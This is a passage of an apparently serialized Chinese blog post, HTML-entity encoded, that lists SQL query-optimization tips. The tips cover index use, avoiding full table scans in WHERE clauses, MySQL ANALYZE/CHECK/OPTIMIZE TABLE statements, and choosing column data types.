x6709;&#x7684;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x548C;&#x89E6;&#x53D1;&#x5668;&#x7684;&#x5F00;&#x59CB;&#x5904;&#x8BBE;&#x7F6E; SET NOCOUNT ON ,&#x5728;&#x7ED3;&#x675F;&#x65F6;&#x8BBE;&#x7F6E; SET NOCOUNT OFF &#x3001;&#x65E0;&#x9700;&#x5728;&#x6267;&#x884C;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x548C;&#x89E6;&#x53D1;&#x5668;&#x7684;&#x6BCF;&#x4E2A;&#x8BED;&#x53E5;&#x540E;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001; DONE_IN_PROC &#x6D88;&#x606F;&#x3002;</p>\n<p>29&#x3001;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5927;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF0C;&#x63D0;&#x9AD8;&#x7CFB;&#x7EDF;&#x5E76;&#x53D1;&#x80FD;&#x529B;&#x3002; sql &#x4F18;&#x5316;&#x65B9;&#x6CD5;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x6765;&#x66F4;&#x5FEB;&#x5730;&#x904D;&#x5386;&#x8868;&#x3002; &#x7F3A;&#x7701;&#x60C5;&#x51B5;&#x4E0B;&#x5EFA;&#x7ACB;&#x7684;&#x7D22;&#x5F15;&#x662F;&#x975E;&#x7FA4;&#x96C6;&#x7D22;&#x5F15;&#xFF0C;&#x4F46;&#x6709;&#x65F6;&#x5B83;&#x5E76;&#x4E0D;&#x662F;&#x6700;&#x4F73;&#x7684;&#x3002;&#x5728;&#x975E;&#x7FA4;&#x96C6;&#x7D22;&#x5F15;&#x4E0B;&#xFF0C;&#x6570;&#x636E;&#x5728;&#x7269;&#x7406;&#x4E0A;&#x968F;&#x673A;&#x5B58;&#x653E;&#x5728;&#x6570;&#x636E;&#x9875;&#x4E0A;&#x3002;&#x5408;&#x7406;&#x7684;&#x7D22;&#x5F15;&#x8BBE;&#x8BA1;&#x8981;&#x5EFA;&#x7ACB;&#x5728;&#x5BF9;&#x5404;&#x79CD;&#x67E5;&#x8BE2;&#x7684;&#x5206;&#x6790;&#x548C;&#x9884;&#x6D4B;&#x4E0A;&#x3002;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF1A;</p>\n<p>a&#x3001;&#x6709;&#x5927;&#x91CF;&#x91CD;&#x590D;&#x503C;&#x3001;&#x4E14;&#x7ECF;&#x5E38;&#x6709;&#x8303;&#x56F4;&#x67E5;&#x8BE2;( &gt; ,&lt; ,&gt; =,&lt; =)&#x548C; order by&#x3001;group by &#x53D1;&#x751F;&#x7684;&#x5217;&#xFF0C;&#x53EF;&#x8003;&#x8651;&#x5EFA;&#x7ACB;&#x96C6;&#x7FA4;&#x7D22;&#x5F15;;</p>\n<p>b&#x3001;&#x7ECF;&#x5E38;&#x540C;&#x65F6;&#x5B58;&#x53D6;&#x591A;&#x5217;&#xFF0C;&#x4E14;&#x6BCF;&#x5217;&#x90FD;&#x542B;&#x6709;&#x91CD;&#x590D;&#x503C;&#x53EF;&#x8003;&#x8651;&#x5EFA;&#x7ACB;&#x7EC4;&#x5408;&#x7D22;&#x5F15;;</p>\n<p>c&#x3001;&#x7EC4;&#x5408;&#x7D22;&#x5F15;&#x8981;&#x5C3D;&#x91CF;&#x4F7F;&#x5173;&#x952E;&#x67E5;&#x8BE2;&#x5F62;&#x6210;&#x7D22;&#x5F15;&#x8986;&#x76D6;&#xFF0C;&#x5176;&#x524D;&#x5BFC;&#x5217;&#x4E00;&#x5B9A;&#x662F;&#x4F7F;&#x7528;&#x6700;&#x9891;&#x7E41;&#x7684;&#x5217;&#x3002;&#x7D22;&#x5F15;&#x867D;&#x6709;&#x52A9;&#x4E8E;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x4F46; &#x4E0D;&#x662F;&#x7D22;&#x5F15;&#x8D8A;&#x591A;&#x8D8A;&#x597D;&#xFF0C;&#x6070;&#x597D;&#x76F8;&#x53CD;&#x8FC7;&#x591A;&#x7684;&#x7D22;&#x5F15;&#x4F1A;&#x5BFC;&#x81F4;&#x7CFB;&#x7EDF;&#x4F4E;&#x6548;&#x3002;&#x7528;&#x6237;&#x5728;&#x8868;&#x4E2D;&#x6BCF;&#x52A0;&#x8FDB;&#x4E00;&#x4E2A;&#x7D22;&#x5F15;&#xFF0C;&#x7EF4;&#x62A4;&#x7D22;&#x5F15;&#x96C6;&#x5408;&#x5C31; &#x8981;&#x505A;&#x76F8;&#x5E94;&#x7684;&#x66F4;&#x65B0;&#x5DE5;&#x4F5C;&#x3002;</p>\n<p>30&#x3001;&#x5B9A;&#x671F;&#x5206;&#x6790;&#x8868;&#x548C;&#x68C0;&#x67E5;&#x8868;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x5206;&#x6790;&#x8868;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;ANALYZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tb1_name[, tbl_name]&#x3001;&#x3001;&#x3001;</span><br></pre></td></tr></table></figure></p>\n<p>&#x4EE5;&#x4E0A;&#x8BED;&#x53E5;&#x7528;&#x4E8E;&#x5206;&#x6790;&#x548C;&#x5B58;&#x50A8;&#x8868;&#x7684;&#x5173;&#x952E;&#x5B57;&#x5206;&#x5E03;&#xFF0C;&#x5206;&#x6790;&#x7684;&#x7ED3;&#x679C;&#x5C06;&#x53EF;&#x4EE5;&#x4F7F;&#x5F97;&#x7CFB;&#x7EDF;&#x5F97;&#x5230;&#x51C6;&#x786E;&#x7684;&#x7EDF;&#x8BA1;&#x4FE1;&#x606F;&#xFF0C;&#x4F7F;&#x5F97;SQL&#x80FD;&#x591F;&#x751F;&#x6210;&#x6B63;&#x786E;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x3002;&#x5982;&#x679C;&#x7528;&#x6237;&#x611F;&#x89C9;&#x5B9E;&#x9645;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x5E76;&#x4E0D;&#x662F;&#x9884;&#x671F;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;&#xFF0C;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x5206;&#x6790;&#x8868;&#x53EF;&#x80FD;&#x4F1A;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#x3002;&#x5728;&#x5206;&#x6790;&#x671F;&#x95F4;&#xFF0C;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x8BFB;&#x53D6;&#x9501;&#x5B9A;&#x5BF9;&#x8868;&#x8FDB;&#x884C;&#x9501;&#x5B9A;&#x3002;&#x8FD9;&#x5BF9;&#x4E8E;MyISAM&#xFF0C;DBD&#x548C;InnoDB&#x8868;&#x6709;&#x4F5C;&#x7528;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x4F8B;&#x5982;&#x5206;&#x6790;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x8868;&#xFF1A;analyze table table_name</span><br><span class=\"line\">&#x68C0;&#x67E5;&#x8868;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;CHECK TABLE tb1_name[,tbl_name]&#x3001;&#x3001;&#x3001;[option]&#x3001;&#x3001;&#x3001;option = {QUICK | FAST | MEDIUM | EXTENDED | CHANGED}</span><br></pre></td></tr></table></figure></p>\n<p>&#x68C0;&#x67E5;&#x8868;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x68C0;&#x67E5;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x8868;&#x662F;&#x5426;&#x6709;&#x9519;&#x8BEF;&#xFF0C;CHECK TABLE &#x5BF9;MyISAM &#x548C; InnoDB&#x8868;&#x6709;&#x4F5C;&#x7528;&#xFF0C;&#x5BF9;&#x4E8E;MyISAM&#x8868;&#xFF0C;&#x5173;&#x952E;&#x5B57;&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#x88AB;&#x66F4;&#x65B0;</p>\n<p>CHECK TABLE &#x4E5F;&#x53EF;&#x4EE5;&#x68C0;&#x67E5;&#x89C6;&#x56FE;&#x662F;&#x5426;&#x6709;&#x9519;&#x8BEF;&#xFF0C;&#x6BD4;&#x5982;&#x5728;&#x89C6;&#x56FE;&#x5B9A;&#x4E49;&#x4E2D;&#x88AB;&#x5F15;&#x7528;&#x7684;&#x8868;&#x4E0D;&#x5B58;&#x5728;&#x3002;</p>\n<p>31&#x3001;&#x5B9A;&#x671F;&#x4F18;&#x5316;&#x8868;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x4F18;&#x5316;&#x8868;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;OPTIMIZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tb1_name [,tbl_name]&#x3001;&#x3001;&#x3001;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5982;&#x679C;&#x5220;&#x9664;&#x4E86;&#x8868;&#x7684;&#x4E00;&#x5927;&#x90E8;&#x5206;&#xFF0C;&#x6216;&#x8005;&#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x5BF9;&#x542B;&#x6709;&#x53EF;&#x53D8;&#x957F;&#x5EA6;&#x884C;&#x7684;&#x8868;(&#x542B;&#x6709; VARCHAR&#x3001;BLOB&#x6216;TEXT&#x5217;&#x7684;&#x8868;)&#x8FDB;&#x884C;&#x66F4;&#x591A;&#x66F4;&#x6539;&#xFF0C;&#x5219;&#x5E94;&#x4F7F;&#x7528;OPTIMIZE TABLE&#x547D;&#x4EE4;&#x6765;&#x8FDB;&#x884C;&#x8868;&#x4F18;&#x5316;&#x3002;&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x5C06;&#x8868;&#x4E2D;&#x7684;&#x7A7A;&#x95F4;&#x788E;&#x7247;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x6D88;&#x9664;&#x7531;&#x4E8E;&#x5220;&#x9664;&#x6216;&#x8005;&#x66F4;&#x65B0;&#x9020;&#x6210;&#x7684;&#x7A7A;&#x95F4;&#x6D6A;&#x8D39;&#xFF0C;&#x4F46;OPTIMIZE TABLE &#x547D;&#x4EE4;&#x53EA;&#x5BF9;MyISAM&#x3001; BDB &#x548C;InnoDB&#x8868;&#x8D77;&#x4F5C;&#x7528;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x4F8B;&#x5982;&#xFF1A; optimize table table_name</span><br></pre></td></tr></table></figure></p>\n<p>&#x6CE8;&#x610F;&#xFF1A; analyze&#x3001;check&#x3001;optimize&#x6267;&#x884C;&#x671F;&#x95F4;&#x5C06;&#x5BF9;&#x8868;&#x8FDB;&#x884C;&#x9501;&#x5B9A;&#xFF0C;&#x56E0;&#x6B64;&#x4E00;&#x5B9A;&#x6CE8;&#x610F;&#x8981;&#x5728;MySQL&#x6570;&#x636E;&#x5E93;&#x4E0D;&#x7E41;&#x5FD9;&#x7684;&#x65F6;&#x5019;&#x6267;&#x884C;&#x76F8;&#x5173;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>\n<p>&#x8865;&#x5145;&#xFF1A;<br>1&#x3001;&#x5728;&#x6D77;&#x91CF;&#x67E5;&#x8BE2;&#x65F6;&#x5C3D;&#x91CF;&#x5C11;&#x7528;&#x683C;&#x5F0F;&#x8F6C;&#x6362;&#x3002;<br>2&#x3001;ORDER BY &#x548C; GROPU BY:&#x4F7F;&#x7528; ORDER BY &#x548C; GROUP BY &#x77ED;&#x8BED;&#xFF0C;&#x4EFB;&#x4F55;&#x4E00;&#x79CD;&#x7D22;&#x5F15;&#x90FD;&#x6709;&#x52A9;&#x4E8E; SELECT &#x7684;&#x6027;&#x80FD;&#x63D0;&#x9AD8;&#x3002;<br>3&#x3001;&#x4EFB;&#x4F55;&#x5BF9;&#x5217;&#x7684;&#x64CD;&#x4F5C;&#x90FD;&#x5C06;&#x5BFC;&#x81F4;&#x8868;&#x626B;&#x63CF;&#xFF0C;&#x5B83;&#x5305;&#x62EC;&#x6570;&#x636E;&#x5E93;&#x6559;&#x7A0B;&#x51FD;&#x6570;&#x3001;&#x8BA1;&#x7B97;&#x8868;&#x8FBE;&#x5F0F;&#x7B49;&#x7B49;&#xFF0C;&#x67E5;&#x8BE2;&#x65F6;&#x8981;&#x5C3D;&#x53EF;&#x80FD;&#x5C06;&#x64CD;&#x4F5C;&#x79FB; &#x81F3;&#x7B49;&#x53F7;&#x53F3;&#x8FB9;&#x3002;<br>4&#x3001;IN&#x3001;OR &#x5B50;&#x53E5;&#x5E38;&#x4F1A;&#x4F7F;&#x7528;&#x5DE5;&#x4F5C;&#x8868;&#xFF0C;&#x4F7F;&#x7D22;&#x5F15;&#x5931;&#x6548;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x4EA7;&#x751F;&#x5927;&#x91CF;&#x91CD;&#x590D;&#x503C;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x628A;&#x5B50;&#x53E5;&#x62C6;&#x5F00;&#x3002;&#x62C6;&#x5F00;&#x7684;&#x5B50; &#x53E5;&#x4E2D;&#x5E94;&#x8BE5;&#x5305;&#x542B;&#x7D22;&#x5F15;&#x3002;<br>5&#x3001;&#x53EA;&#x8981;&#x80FD;&#x6EE1;&#x8DB3;&#x4F60;&#x7684;&#x9700;&#x6C42;&#xFF0C;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x4F7F;&#x7528;&#x66F4;&#x5C0F;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF1A;&#x4F8B;&#x5982;&#x4F7F;&#x7528; MEDIUMINT &#x4EE3;&#x66FF; INT<br>6&#x3001;&#x5C3D;&#x91CF;&#x628A;&#x6240;&#x6709;&#x7684;&#x5217;&#x8BBE;&#x7F6E;&#x4E3A; NOT NULL,&#x5982;&#x679C;&#x4F60;&#x8981;&#x4FDD;&#x5B58; NULL,&#x624B;&#x52A8;&#x53BB;&#x8BBE;&#x7F6E;&#x5B83;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x628A;&#x5B83;&#x8BBE;&#x4E3A;&#x9ED8;&#x8BA4;&#x503C;&#x3002;<br>7&#x3001;&#x5C3D;&#x91CF;&#x5C11;&#x7528; VARCHAR&#x3001;TEXT&#x3001;BLOB &#x7C7B;&#x578B;<br>8&#x3001;&#x5982;&#x679C;&#x4F60;&#x7684;&#x6570;&#x636E;&#x53EA;&#x6709;&#x4F60;&#x6240;&#x77E5;&#x7684;&#x5C11;&#x91CF;&#x7684;&#x51E0;&#x4E2A;&#x3002;&#x6700;&#x597D;&#x4F7F;&#x7528; ENUM &#x7C7B;&#x578B;<br>9&#x3001;&#x6B63;&#x5982; graymice &#x6240;&#x8BB2;&#x7684;&#x90A3;&#x6837;&#xFF0C;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x3002;<br>10&#x3001;&#x5408;&#x7406;&#x7528;&#x8FD0;&#x5206;&#x8868;&#x4E0E;&#x5206;&#x533A;&#x8868;&#x63D0;&#x9AD8;&#x6570;&#x636E;&#x5B58;&#x653E;&#x548C;&#x63D0;&#x53D6;&#x901F;&#x5EA6;&#x3002;</p>\n","excerpt":"<p>1&#x3001;&#x5BF9;&#x67E5;&#x8BE2;&#x8FDB;&#x884C;&#x4F18;&#x5316;&#xFF0C;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;&#x9996;&#x5148;&#x5E94;&#x8003;&#x8651;&#x5728; where &#x53CA; order by &#x6D89;&#x53CA;&#x7684;&#x5217;&#x4E0A;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x3002;</p>\n<p>2&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x5BF9;&#x5B57;&#x6BB5;&#x8FDB;&#x884C; null &#x503C;&#x5224;&#x65AD;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num is null;</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x5728; num &#x4E0A;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x503C; 0,&#x786E;&#x4FDD;&#x8868;&#x4E2D; num &#x5217;&#x6CA1;&#x6709; null &#x503C;&#xFF0C;&#x7136;&#x540E;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num=0;</span><br></pre></td></tr></table></figure></p>\n<p>3&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x4F7F;&#x7528;!=&#x6216;&lt;&gt;&#x64CD;&#x4F5C;&#x7B26;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;</p>\n<p>4&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x4F7F;&#x7528; or &#x6765;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num=10 or num=20;</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num=10 union all select id from t <span class=\"built_in\">where</span> num=20;</span><br></pre></td></tr></table></figure></p>","more":"<p>5&#x3001;in &#x548C; not in &#x4E5F;&#x8981;&#x614E;&#x7528;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x5BFC;&#x81F4;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;&#x5982;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num <span class=\"keyword\">in</span>(1,2,3);</span><br></pre></td></tr></table></figure></p>\n<p>&#x5BF9;&#x4E8E;&#x8FDE;&#x7EED;&#x7684;&#x6570;&#x503C;&#xFF0C;&#x80FD;&#x7528; between &#x5C31;&#x4E0D;&#x8981;&#x7528; in &#x4E86;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num between 1 and 3;</span><br></pre></td></tr></table></figure></p>\n<p>6&#x3001;&#x4E0B;&#x9762;&#x7684;&#x67E5;&#x8BE2;&#x4E5F;&#x5C06;&#x5BFC;&#x81F4;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> name like <span class=\"string\">&apos;%c%&apos;</span>;</span><br></pre></td></tr></table></figure></p>\n<p>&#x82E5;&#x8981;&#x63D0;&#x9AD8;&#x6548;&#x7387;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x5168;&#x6587;&#x68C0;&#x7D22;&#x3002;</p>\n<p>7&#x3001;&#x5982;&#x679C;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x4F7F;&#x7528;&#x53C2;&#x6570;&#xFF0C;&#x4E5F;&#x4F1A;&#x5BFC;&#x81F4;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;&#x56E0;&#x4E3A; SQL &#x53EA;&#x6709;&#x5728;&#x8FD0;&#x884C;&#x65F6;&#x624D;&#x4F1A;&#x89E3;&#x6790;&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#xFF0C;&#x4F46;&#x4F18; &#x5316;&#x7A0B;&#x5E8F;&#x4E0D;&#x80FD;&#x5C06;&#x8BBF;&#x95EE;&#x8BA1;&#x5212;&#x7684;&#x9009;&#x62E9;&#x63A8;&#x8FDF;&#x5230;&#x8FD0;&#x884C;&#x65F6;;&#x5B83;&#x5FC5;&#x987B;&#x5728;&#x7F16;&#x8BD1;&#x65F6;&#x8FDB;&#x884C;&#x9009;&#x62E9;&#x3002;&#x7136; &#x800C;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x7F16;&#x8BD1;&#x65F6;&#x5EFA;&#x7ACB;&#x8BBF;&#x95EE;&#x8BA1; &#x5212;&#xFF0C;&#x53D8;&#x91CF;&#x7684;&#x503C;&#x8FD8;&#x662F;&#x672A;&#x77E5;&#x7684;&#xFF0C;&#x56E0;&#x800C;&#x65E0;&#x6CD5;&#x4F5C;&#x4E3A;&#x7D22;&#x5F15;&#x9009;&#x62E9;&#x7684;&#x8F93;&#x5165;&#x9879;&#x3002;&#x5982;&#x4E0B;&#x9762;&#x8BED;&#x53E5;&#x5C06;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num=@num ;</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x6539;&#x4E3A;&#x5F3A;&#x5236;&#x67E5;&#x8BE2;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t with(index(&#x7D22;&#x5F15;&#x540D;)) <span class=\"built_in\">where</span> num=@num ;</span><br></pre></td></tr></table></figure></p>\n<p>8&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x5BF9;&#x5B57;&#x6BB5;&#x8FDB;&#x884C;&#x8868;&#x8FBE;&#x5F0F;&#x64CD;&#x4F5C;&#xFF0C; &#x8FD9;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num/2=100;</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num=100*2;</span><br></pre></td></tr></table></figure></p>\n<p>9&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x5BF9;&#x5B57;&#x6BB5;&#x8FDB;&#x884C;&#x51FD;&#x6570;&#x64CD;&#x4F5C;&#xFF0C;&#x8FD9;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;&#x5982;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> substring(name,1,3)=<span class=\"string\">&apos;abc&apos;</span>;<span class=\"comment\">#name &#x4EE5; abc &#x5F00;&#x5934;&#x7684; id</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x5E94;&#x6539;&#x4E3A;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> name like <span class=\"string\">&apos;abc%&apos;</span>;</span><br></pre></td></tr></table></figure></p>\n<p>10&#x3001;&#x4E0D;&#x8981;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x7684;&#x201C;=&#x201D;&#x5DE6;&#x8FB9;&#x8FDB;&#x884C;&#x51FD;&#x6570;&#x3001;&#x7B97;&#x672F;&#x8FD0;&#x7B97;&#x6216;&#x5176;&#x4ED6;&#x8868;&#x8FBE;&#x5F0F;&#x8FD0;&#x7B97;&#xFF0C;&#x5426;&#x5219;&#x7CFB;&#x7EDF;&#x5C06;&#x53EF;&#x80FD;&#x65E0;&#x6CD5;&#x6B63;&#x786E;&#x4F7F;&#x7528; &#x7D22;&#x5F15;&#x3002;</p>\n<p>11&#x3001;&#x5728;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x5B57;&#x6BB5;&#x4F5C;&#x4E3A;&#x6761;&#x4EF6;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x8BE5;&#x7D22;&#x5F15;&#x662F;&#x590D;&#x5408;&#x7D22;&#x5F15;&#xFF0C;&#x90A3;&#x4E48;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x5230;&#x8BE5;&#x7D22;&#x5F15;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x4F5C;&#x4E3A;&#x6761;&#x4EF6; &#x65F6;&#x624D;&#x80FD;&#x4FDD;&#x8BC1;&#x7CFB;&#x7EDF;&#x4F7F;&#x7528;&#x8BE5;&#x7D22;&#x5F15;&#xFF0C; &#x5426;&#x5219;&#x8BE5;&#x7D22;&#x5F15;&#x5C06;&#x4E0D;&#x4F1A; &#x88AB;&#x4F7F;&#x7528;&#xFF0C; &#x5E76;&#x4E14;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x8BA9;&#x5B57;&#x6BB5;&#x987A;&#x5E8F;&#x4E0E;&#x7D22;&#x5F15;&#x987A;&#x5E8F;&#x76F8;&#x4E00;&#x81F4;&#x3002;</p>\n<p>12&#x3001;&#x4E0D;&#x8981;&#x5199;&#x4E00;&#x4E9B;&#x6CA1;&#x6709;&#x610F;&#x4E49;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x5982;&#x9700;&#x8981;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x7A7A;&#x8868;&#x7ED3;&#x6784;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select col1,col2 into <span class=\"comment\">#t from t where 1=0;</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x7C7B;&#x4EE3;&#x7801;&#x4E0D;&#x4F1A;&#x8FD4;&#x56DE;&#x4EFB;&#x4F55;&#x7ED3;&#x679C;&#x96C6;&#xFF0C;&#x4F46;&#x662F;&#x4F1A;&#x6D88;&#x8017;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x7684;&#xFF0C;&#x5E94;&#x6539;&#x6210;&#x8FD9;&#x6837;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql 